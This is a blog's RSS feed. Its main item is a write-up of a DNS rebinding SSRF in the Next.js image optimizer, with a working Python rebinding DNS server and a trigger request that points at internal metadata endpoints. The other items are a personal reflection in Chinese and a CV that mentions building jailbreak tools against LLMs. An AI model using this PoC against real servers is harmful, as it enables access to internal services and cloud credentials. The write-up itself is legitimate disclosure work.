+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>b1ue0cean's world</title><link>https://BestRun.github.io/</link><description>b1ue0cean's world</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 08 Sep 2026 22:53:23 +0200</lastBuildDate><atom:link href="https://BestRun.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Next.js DNS Rebinding SSRF</title><link>https://BestRun.github.io/posts/nextjs_ssrf/</link><pubDate>Tue, 08 Sep 2026 22:53:23 +0200</pubDate><guid>https://BestRun.github.io/posts/nextjs_ssrf/</guid><description>&lt;h2 id="nextjs-dns-rebinding-vulnerability" >Next.js DNS Rebinding Vulnerability
+&lt;span>
+&lt;a href="#nextjs-dns-rebinding-vulnerability">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>Recently, I moved to CISPA Saarbrücken to work on my thesis. I chose to live close to the university, which means, once again, I ended up in a village.&lt;/p>
+&lt;p>Living here is like a &amp;ldquo;修行&amp;rdquo; — no social life, just a handful of PhD friends. To keep myself entertained, I picked up an old hobby: bug bounty, for fun and for money.&lt;/p>
+&lt;p>I put together a simple hunting pipeline and found an SSRF bug in Next.js. Turns out someone published a &lt;a href="https://seclists.org/fulldisclosure/2026/Sep/29">similar finding&lt;/a> just a few days before me. Timing is everything.&lt;/p>
+&lt;p>With PhD and internship interviews coming up, I figured writing a few blog posts might help me quickly recall vulnerability hunting techniques when I need them most.&lt;/p>
+&lt;hr>
+&lt;h2 id="how-does-dns-lookup-work" >How Does DNS Lookup Work?
+&lt;span>
+&lt;a href="#how-does-dns-lookup-work">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>This is a bbbbb-basic question in any interview, but it&amp;rsquo;s worth spelling out because the attack below only makes sense if you understand the full resolution chain.&lt;/p>
+&lt;p>The 8 steps in a DNS lookup:&lt;/p>
+&lt;ol>
+&lt;li>A user types &lt;code>example.com&lt;/code> into a browser. The query travels to a DNS recursive resolver.&lt;/li>
+&lt;li>The resolver queries a DNS root nameserver (&lt;code>.&lt;/code>).&lt;/li>
+&lt;li>The root server responds with the address of the Top Level Domain (TLD) nameserver (e.g. &lt;code>.com&lt;/code>).&lt;/li>
+&lt;li>The resolver queries the &lt;code>.com&lt;/code> TLD nameserver.&lt;/li>
+&lt;li>The TLD server responds with the address of the authoritative nameserver for &lt;code>example.com&lt;/code>.&lt;/li>
+&lt;li>The resolver queries that authoritative nameserver.&lt;/li>
+&lt;li>The authoritative nameserver returns the IP address for &lt;code>example.com&lt;/code>.&lt;/li>
+&lt;li>The resolver passes the IP back to the browser. Done.&lt;/li>
+&lt;/ol>
+&lt;p>The critical detail: &lt;strong>whoever controls the authoritative nameserver for a domain controls what IP it resolves to&lt;/strong> — including private IPs like &lt;code>127.0.0.1&lt;/code>. The DNS protocol has no mechanism to prevent this. All defenses against it are built at the application layer.&lt;/p>
+&lt;hr>
+&lt;h2 id="the-vulnerability" >The Vulnerability
+&lt;span>
+&lt;a href="#the-vulnerability">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>The story starts at the &lt;a href="https://github.com/vercel/next.js/blob/afb0dbac6a0daeeca12d72759e51bd3493e16a0d/packages/next/src/server/image-optimizer.ts#L521">&lt;code>fetchExternalImage&lt;/code>&lt;/a> function. Next.js has an &lt;code>isPrivateIp&lt;/code> guard to block SSRF, and it even &lt;a href="https://github.com/vercel/next.js/blob/afb0dbac6a0daeeca12d72759e51bd3493e16a0d/packages/next/src/server/image-optimizer.ts#L580">applies this check recursively&lt;/a> through 302 redirects. Looks solid.&lt;/p>
+&lt;p>But here&amp;rsquo;s the problem. Inside &lt;code>fetchExternalImage&lt;/code>, the code does:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Step 1: resolve the hostname and check the IP
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">records&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">lookup&lt;/span>(&lt;span style="color:#a6e22e">hostname&lt;/span>, { &lt;span style="color:#a6e22e">all&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span> }); &lt;span style="color:#75715e">// resolution T1
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">records&lt;/span>.&lt;span style="color:#a6e22e">some&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span> =&amp;gt; &lt;span style="color:#a6e22e">isPrivateIp&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">address&lt;/span>))) &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Step 2: fetch the URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#a6e22e">href&lt;/span>, { &lt;span style="color:#a6e22e">redirect&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#39;manual&amp;#39;&lt;/span> }); &lt;span style="color:#75715e">// resolution T2 (inside undici)
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>fetch()&lt;/code> is called with just the original &lt;code>href&lt;/code> string — no custom dispatcher, no IP pinning. That means undici resolves the hostname &lt;strong>again&lt;/strong>, completely independently. The IP that passed &lt;code>isPrivateIp&lt;/code> at T1 has nothing to do with the IP actually connected to at T2.&lt;/p>
+&lt;p>This is a classic TOCTOU: &lt;strong>time of check, time of use&lt;/strong>.&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Time&lt;/th>
+&lt;th>Action&lt;/th>
+&lt;th>DNS Answer&lt;/th>
+&lt;th>Result&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>T1&lt;/td>
+&lt;td>&lt;code>lookup(hostname)&lt;/code> → isPrivateIp&lt;/td>
+&lt;td>&lt;code>8.8.8.8&lt;/code> (public)&lt;/td>
+&lt;td>✅ passes&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>T2&lt;/td>
+&lt;td>&lt;code>fetch(hostname)&lt;/code> → undici resolves again&lt;/td>
+&lt;td>&lt;code>127.0.0.1&lt;/code> (loopback)&lt;/td>
+&lt;td>connects to internal service&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;p>To exploit this, an attacker registers a domain, points its NS record to their own server, and has that server return a public IP on the first DNS query and &lt;code>127.0.0.1&lt;/code> on the second. Setting TTL=0 ensures the recursive resolver never caches the first answer, so both queries hit the attacker&amp;rsquo;s server and get different responses.&lt;/p>
+&lt;hr>
+&lt;h2 id="poc" >PoC
+&lt;span>
+&lt;a href="#poc">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>The attacker runs an authoritative DNS server that flips its answer based on query count:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># pip install dnslib&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> dnslib &lt;span style="color:#f92672">import&lt;/span> RR, QTYPE, A
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> dnslib.server &lt;span style="color:#f92672">import&lt;/span> DNSServer, BaseResolver
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> threading
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>REBIND_DOMAIN &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;rebind.attacker.test.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PUBLIC_IP &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;1.2.3.4&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>INTERNAL_IP &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span> &lt;span style="color:#75715e"># or 169.254.169.254&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">RebindResolver&lt;/span>(BaseResolver):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>seen &lt;span style="color:#f92672">=&lt;/span> {}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lock &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Lock()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">resolve&lt;/span>(self, request, handler):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_ip &lt;span style="color:#f92672">=&lt;/span> handler&lt;span style="color:#f92672">.&lt;/span>client_address[&lt;span style="color:#ae81ff">0&lt;/span>]
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qname &lt;span style="color:#f92672">=&lt;/span> str(request&lt;span style="color:#f92672">.&lt;/span>q&lt;span style="color:#f92672">.&lt;/span>qname)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reply &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>reply()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> qname &lt;span style="color:#f92672">==&lt;/span> REBIND_DOMAIN &lt;span style="color:#f92672">and&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>q&lt;span style="color:#f92672">.&lt;/span>qtype &lt;span style="color:#f92672">==&lt;/span> QTYPE&lt;span style="color:#f92672">.&lt;/span>A:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lock:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>seen&lt;span style="color:#f92672">.&lt;/span>get(client_ip, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>seen[client_ip] &lt;span style="color:#f92672">=&lt;/span> n
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># query #1 → public IP (passes isPrivateIp)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># query #2+ → internal IP (where fetch actually connects)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ip &lt;span style="color:#f92672">=&lt;/span> PUBLIC_IP &lt;span style="color:#66d9ef">if&lt;/span> n &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> INTERNAL_IP
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;[DNS] &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>client_ip&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> query #&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> -&amp;gt; &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>ip&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reply&lt;span style="color:#f92672">.&lt;/span>add_answer(RR(
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rname&lt;span style="color:#f92672">=&lt;/span>qname,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rtype&lt;span style="color:#f92672">=&lt;/span>QTYPE&lt;span style="color:#f92672">.&lt;/span>A,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rdata&lt;span style="color:#f92672">=&lt;/span>A(ip),
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ttl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e"># no caching — every lookup hits this server&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> reply
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server &lt;span style="color:#f92672">=&lt;/span> DNSServer(RebindResolver(), port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">53&lt;/span>, address&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;0.0.0.0&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>server&lt;span style="color:#f92672">.&lt;/span>start_thread()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>input(&lt;span style="color:#e6db74">&amp;#34;Press Enter to stop...&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Trigger it by sending a request to the Next.js image optimizer with a URL pointing to your rebinding domain:&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET /_next/image?url=http%3A%2F%2Frebind.attacker.test%3A9099%2Flatest%2Fmeta-data%2F&amp;amp;w=64&amp;amp;q=75
+&lt;/code>&lt;/pre>&lt;p>The optimizer calls &lt;code>lookup()&lt;/code> (T1, gets &lt;code>1.2.3.4&lt;/code>, passes the guard), then &lt;code>fetch()&lt;/code> (T2, undici resolves again, gets &lt;code>127.0.0.1&lt;/code>, connects to your internal service). You get a 200 back with the internal server&amp;rsquo;s content wrapped in a PNG response.&lt;/p>
+&lt;hr>
+&lt;h2 id="references" >References
+&lt;span>
+&lt;a href="#references">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;ul>
+&lt;li>&lt;a href="https://seclists.org/fulldisclosure/2026/Sep/29">Similar finding on Full Disclosure&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.cloudflare.com/learning/dns/what-is-dns/">Cloudflare: What is DNS?&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/DNS%20Rebinding/README.md">PayloadsAllTheThings — DNS Rebinding&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/taviso/rbndr">taviso/rbndr — public DNS rebinding test service&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>对关系的一些思考</title><link>https://BestRun.github.io/life/%E5%AF%B9%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</link><pubDate>Sun, 09 Aug 2026 20:42:05 +0200</pubDate><guid>https://BestRun.github.io/life/%E5%AF%B9%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/</guid><description>&lt;p>健身时闲来无事，反思一下自己到底会被什么样的人吸引（无论性别）。&lt;/p>
+&lt;p>因为我朋友跟我说，你反省一下自己，为什么总是吸引不到正确的人。&lt;/p>
+&lt;p>所以分两方面吧：我容易被什么样的人吸引，以及我有概率吸引到什么样的人。&lt;/p>
+&lt;p>我觉得吸引也分两部分：一种是欣赏角度的吸引，一种是生活陪伴意义上的吸引。从欣赏的角度来说，我很容易欣赏这样一种人：强者，有明确的目标、独立的想法，并愿意为之放弃很多，resilient、独立。为什么？因为我觉得这是我欣赏的态度，也是我一直践行的态度。&lt;/p>
+&lt;p>比如刚到丹麦的时候，我遇到了 Black 同学。我只跟他聊了几次，就觉得我们本质上是十分相似的人。他是那种在混乱的世界中，依然愿意坚守自己理想的人。简单点说，就是有自己的想法，并且愿意为之付出努力。他跟我说过一句让我印象很深的话：“如果读博期间有一天，我发现我认为自己的研究方向已经被解决了，我可能就会放弃读博，去做个 bartender。” 果然，在一年内，他在 HCI 方向连发了几篇顶会，也拿到了几个非常好的博士 offer。&lt;/p>
+&lt;p>我的老友 Oswin，是我的高中校友，现在在 Oxford 读 Physics 的 PhD。他和我一起度过了高中的竞赛时光，本科期间我们也一直互相努力。最后，他先我一步去了 Oxford 读博士，而我也还在申请中。我们都选择了学术这条道路。我们有相似的理想：希望在自己的领域内做出一些改变；我们也都憧憬未来，并相信只有自己才能拯救自己。我觉得我们对于彼此来说，都是为数不多能够真正相互理解的人。当然，我觉得这种理解建立在相似的经历之上，需要十年的筛选，甚至还需要一点聪明，才能够真正理解对方。&lt;/p>
+&lt;p>从生活陪伴上来说，如果我们处得来，大多是因为我们有还算 match 的背景，有相同的爱好，比如健身、喝酒，或者对方能给我一些我觉得有用的建议，比如情感上的建议。在丹麦遇到的 Wen 陪我度过了在丹麦最抑郁的几个月。我们每天健身、坐图书馆。我觉得这种算是陪伴意义上的吸引。
+但欣赏和喜欢是两回事。&lt;/p>
+&lt;p>Oswin 跟我说，他现在找另一半的标准，就是对未来的规划一致，并且能够理解他在做什么。我说，那要求有些太具体了吧？难道还必须是学物理的？学化学的博士就不行？他笑了笑说，学化学的也不是完全不能理解我在做什么。他笑着跟我说：“你经历了就知道自己希望的另一半是什么样的了，只不过对你来说，心动来得有些太晚了。” （感慨依稀：老了老了）&lt;/p>
+&lt;p>你问我怎么看。&lt;/p>
+&lt;p>我觉得我可能还是有些理想主义吧，希望能从对方身上找到我缺失的那一部分。希望双方在一起可以互相促进。但事实证明，这似乎不一定是一个很好的选择。可我又不喜欢那种只被我好的一面吸引的人。我会觉得，对方并不理解我的脆弱，也不理解我隐藏起来的另一面。所以就很矛盾。我是不是太作了，要求太多了。&lt;/p>
+&lt;p>最近发现，我总希望对一些事情要一个答案。（该死的理工科思维！&lt;/p>
+&lt;p>但其实，很多事情根本不需要答案。&lt;/p>
+&lt;p>有时候没有答案也挺美好的。&lt;/p></description></item><item><title>about &amp; CV</title><link>https://BestRun.github.io/about/about/</link><pubDate>Sun, 21 Dec 2025 18:37:28 +0800</pubDate><guid>https://BestRun.github.io/about/about/</guid><description>&lt;h2 id="whoami" >WHOAMI
+&lt;span>
+&lt;a href="#whoami">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;ul>
+&lt;li>I spent four rewarding years at Fuzhou University, majoring in Artificial Intelligence.&lt;/li>
+&lt;li>I interned at the Institute of Software, Chinese Academy of Sciences, under Prof. Xiang Ling (&lt;a href="https://ryderling.github.io/">https://ryderling.github.io/&lt;/a>).&lt;/li>
+&lt;li>I am currently pursuing an M.S. in Computer Engineering at Aarhus University.&lt;/li>
+&lt;li>I worked with Prof. Anders Møller (&lt;a href="https://cs.au.dk/~amoeller/">https://cs.au.dk/~amoeller/&lt;/a>) on taint analysis.&lt;/li>
+&lt;li>I am currently an exchange student at the Technical University of Munich (TUM).&lt;/li>
+&lt;li>I will conduct my master’s thesis at CISPA Helmholtz Center for Information Security in collaboration with &lt;a href="https://mengrj.github.io/">Ruijie Meng&lt;/a>.&lt;/li>
+&lt;li>I am deeply interested in the intersection of artificial intelligence and cybersecurity and plan to pursue a Ph.D. in this area.&lt;/li>
+&lt;/ul>
+&lt;h2 id="internship-experiences" >Internship experiences
+&lt;span>
+&lt;a href="#internship-experiences">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;ol>
+&lt;li>Yigeyun (Jan 2023 - Mar 2023)&lt;/li>
+&lt;li>ISCAS (Jul 2023 - Mar 2025)&lt;/li>
+&lt;/ol>
+&lt;h2 id="research-experiences" >Research experiences:
+&lt;span>
+&lt;a href="#research-experiences">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;p>&lt;a href="https://scholar.google.com/citations?hl=zh-TW&amp;amp;user=F3-nuQkAAAAJ">Google Scholar&lt;/a>&lt;/p>
+&lt;h2 id="some-awards" >Some awards
+&lt;span>
+&lt;a href="#some-awards">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h2>&lt;h3 id="ai-competition" >AI competition
+&lt;span>
+&lt;a href="#ai-competition">
+&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
+&lt;/a>
+&lt;/span>
+&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>CVPR 2025 Workshop – Jailbreaking Attacks on Multimodal Foundation Models&lt;/strong> — 1st place, Team Leader (May 2025)
+&lt;ul>
+&lt;li>Jailbroke two provided multimodal models plus one black-box model; achieved the top score of 93.56.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>AIGC Adversarial Detection Competition, Image Attack Track (Tencent Zhuque Lab)&lt;/strong> — 1st place, Team Leader (May 2025)
+&lt;ul>
+&lt;li>Built an automated prompt generator to make V2I outputs evade the Zhuque AIGC detector; &lt;a href="https://arxiv.org/abs/2505.23192">writeup&lt;/a>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>Datacon 2024 AI Security Track&lt;/strong> — Top 3 / First Prize (Team Leader, Dec 2024)
+&lt;ul>
+&lt;li>Led LLM hallucination triggering and LLM-based threat intelligence extraction; delivered a graph-based RAG threat-intel extractor.&lt;/li>
+&lt;li>&lt;a href="https://www.datacon.org.cn/competition/competitions/91/introduction">Competition link&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/3RHiILBsAv3UzB4dAIJ5Hg">Recap&lt;/a>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>ByteDance / ByteAI AI Security Competition&lt;/strong> — 3rd place, Team Leader (Nov 2024)
+&lt;ul>
+&lt;li>Built an automated jailbreak tool bypassing LLM defenses; focused on prompt leaking &amp;amp; jailbreak challenges.&lt;/li>
+&lt;li>&lt;a href="https://security.bytedance.com/news/2024-security-style-challenge-launch">Competition link&lt;/a> | &lt;a href="https://x.com/b1ue0cean7/status/1850741725641482610">Recap&lt;/a>.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="ctf" >CTF
+&lt;span>
+&lt;a href="#ctf">
